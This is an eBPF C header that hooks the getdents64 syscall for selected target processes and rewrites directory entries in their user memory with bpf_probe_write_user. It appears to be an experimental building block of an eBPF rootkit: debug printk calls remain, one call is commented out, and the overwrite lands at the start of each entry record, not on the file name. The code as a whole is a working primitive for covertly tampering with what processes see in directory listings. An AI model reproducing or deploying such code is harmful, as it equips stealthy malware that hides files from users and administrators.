#pragma once

#include "vmlinux.h"

#include "utils/is_target.h"
#include "utils/write_user.h"

struct {
  __uint(type, BPF_MAP_TYPE_HASH);
  __uint(max_entries, 8192);
  __type(key, tid_t);
  __type(value, u64);
} dir_entries SEC(".maps");

SEC("tracepoint/syscalls/sys_enter_getdents64")
int enter_getdents64(struct trace_event_raw_sys_enter *ctx) {
  if (!is_target_proc()) return 0;
  tid_t tid = bpf_get_current_pid_tgid();

  struct linux_dirent64 *d_entry = (struct linux_dirent64 *)ctx->args[1];
  if (d_entry == NULL) return 1;

  bpf_map_update_elem(&dir_entries, &tid, &d_entry, BPF_ANY);
  return 0;
}

#define MAX_D_NAME_LEN 128
SEC("tracepoint/syscalls/sys_exit_getdents64")
int exit_getdents64(struct trace_event_raw_sys_exit *ctx) {
  tid_t tid = bpf_get_current_pid_tgid();

  struct linux_dirent64 **dir_addr =
      (struct linux_dirent64 **)bpf_map_lookup_elem(&dir_entries, &tid);
  if (dir_addr == NULL) return 1;

  bpf_map_delete_elem(&dir_entries, &tid);

//  return write_user(*dir_addr);

  long offset = 0;
  // limitation for now, only examine the first 256 entries
  for (int i = 0; i < 256; i++) {
    struct linux_dirent64 *d_entry =
        (struct linux_dirent64 *)((char *)*dir_addr + offset);

    // read d_name
    char d_name[MAX_D_NAME_LEN];
    long err = bpf_probe_read_user(&d_name, MAX_D_NAME_LEN, d_entry->d_name);
    if (!err) {
      bpf_printk("d_name \"%s\"", d_name);
      long ret = bpf_probe_write_user(d_entry, "x", sizeof(char));
      if (ret) {
        bpf_printk("getdents: bpf_probe_write_user failed: %ld", ret);
      }
    }

    // read d_reclen
    unsigned short int d_reclen;
    bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &d_entry->d_reclen);
    offset += d_reclen;
    if (offset >= ctx->ret) return 0;
  }

  return 0;
}
